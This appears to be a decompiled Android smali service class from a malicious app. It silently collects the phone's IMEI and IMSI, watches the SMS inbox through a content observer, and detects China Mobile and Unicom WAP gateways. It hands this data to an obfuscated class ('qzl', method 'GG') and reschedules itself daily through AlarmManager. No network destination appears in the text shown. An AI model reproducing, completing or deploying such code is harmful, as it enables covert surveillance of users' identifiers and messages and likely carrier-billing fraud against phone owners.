.class public Lcom/xxx/yyy/MyService;
.super Landroid/app/Service;
.source "MyService.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "MyService"

.field private static final sleeptime:I = 0x5a0


# instance fields
.field alarms:Landroid/app/AlarmManager;

.field imei:Ljava/lang/String;

.field imsi:Ljava/lang/String;

.field iswap:I

.field pendingIntent:Landroid/app/PendingIntent;

.field smsObserver:Lcom/xxx/yyy/SMSObserver;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 42
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 57
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/xxx/yyy/MyService;->smsObserver:Lcom/xxx/yyy/SMSObserver;

    .line 42
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 49
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 8

    .prologue
    const/4 v4, 0x0

    const-string v5, ""

    .line 61
    const-string v3, "phone"

    invoke-virtual {p0, v3}, Lcom/xxx/yyy/MyService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/telephony/TelephonyManager;

    .line 62
    .local v2, "mTelephonyMgr":Landroid/telephony/TelephonyManager;
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    .line 63
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    .line 65
    iget-object v3, p0, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    if-nez v3, :cond_0

    .line 66
    const-string v3, ""

    iput-object v5, p0, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    .line 68
    :cond_0
    iget-object v3, p0, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    if-nez v3, :cond_1

    .line 69
    const-string v3, ""

    iput-object v5, p0, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    .line 71
    :cond_1
    const-string v3, "alarm"

    invoke-virtual {p0, v3}, Lcom/xxx/yyy/MyService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/AlarmManager;

    iput-object v3, p0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    .line 75
    const-string v0, "com.lz.myservicestart"

    .line 77
    .local v0, "ALARM_ACTION":Ljava/lang/String;
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 79
    .local v1, "intentToFire":Landroid/content/Intent;
    invoke-static {p0, v4, v1, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    iput-object v3, p0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    .line 81
    iget-object v3, p0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    const/4 v4, 0x2

    const-wide/32 v5, 0x5265c00

    iget-object v7, p0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    invoke-virtual {v3, v4, v5, v6, v7}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 83
    iget-object v3, p0, Lcom/xxx/yyy/MyService;->smsObserver:Lcom/xxx/yyy/SMSObserver;

    if-nez v3, :cond_2

    .line 85
    new-instance v3, Lcom/xxx/yyy/SMSObserver;

    new-instance v4, Landroid/os/Handler;

    invoke-direct {v4}, Landroid/os/Handler;-><init>()V

    invoke-direct {v3, v4, p0}, Lcom/xxx/yyy/SMSObserver;-><init>(Landroid/os/Handler;Landroid/content/Context;)V

    iput-object v3, p0, Lcom/xxx/yyy/MyService;->smsObserver:Lcom/xxx/yyy/SMSObserver;

    .line 86
    invoke-virtual {p0}, Lcom/xxx/yyy/MyService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "content://sms/"

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    const/4 v5, 0x1

    iget-object v6, p0, Lcom/xxx/yyy/MyService;->smsObserver:Lcom/xxx/yyy/SMSObserver;

    invoke-virtual {v3, v4, v5, v6}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 90
    :cond_2
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 96
    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 13
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "startid"    # I

    .prologue
    .line 101
    const/4 v6, 0x2

    .line 103
    .local v6, "alarmType":I
    const-string v1, "connectivity"

    invoke-virtual {p0, v1}, Lcom/xxx/yyy/MyService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/net/ConnectivityManager;

    .line 104
    .local v7, "connec":Landroid/net/ConnectivityManager;
    invoke-virtual {v7}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v9

    .line 105
    .local v9, "info":Landroid/net/NetworkInfo;
    invoke-virtual {v9}, Landroid/net/NetworkInfo;->getExtraInfo()Ljava/lang/String;

    move-result-object v8

    .line 106
    .local v8, "extraInfo":Ljava/lang/String;
    const/4 v1, 0x1

    iput v1, p0, Lcom/xxx/yyy/MyService;->iswap:I

    .line 108
    if-eqz v8, :cond_1

    const-string v1, "CMWAP"

    invoke-virtual {v8, v1}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v1

    if-eqz v1, :cond_0

    .line 109
    const-string v1, "UNIWAP"

    invoke-virtual {v8, v1}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_1

    .line 111
    :cond_0
    const/4 v1, 0x0

    iput v1, p0, Lcom/xxx/yyy/MyService;->iswap:I

    .line 113
    :cond_1
    invoke-virtual {v9}, Landroid/net/NetworkInfo;->getTypeName()Ljava/lang/String;

    move-result-object v12

    .line 114
    .local v12, "typeinfo":Ljava/lang/String;
    if-eqz v12, :cond_2

    invoke-virtual {v12}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    const-string v2, "wifi"

    invoke-virtual {v1, v2}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_2

    .line 116
    const/4 v1, 0x2

    iput v1, p0, Lcom/xxx/yyy/MyService;->iswap:I

    .line 119
    :cond_2
    new-instance v0, Lcom/xxx/yyy/qzl;

    iget-object v2, p0, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    iget-object v3, p0, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    iget v4, p0, Lcom/xxx/yyy/MyService;->iswap:I

    iget-object v5, p0, Lcom/xxx/yyy/MyService;->smsObserver:Lcom/xxx/yyy/SMSObserver;

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Lcom/xxx/yyy/qzl;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;ILcom/xxx/yyy/SMSObserver;)V

    .line 120
    .local v0, "d":Lcom/xxx/yyy/qzl;
    invoke-virtual {v0}, Lcom/xxx/yyy/qzl;->GG()V

    .line 122
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v1

    const-wide/32 v3, 0x5265c00

    add-long v10, v1, v3

    .line 123
    .local v10, "timeToRefresh":J
    iget-object v1, p0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    iget-object v2, p0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    invoke-virtual {v1, v6, v10, v11, v2}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 127
    return-void
.end method
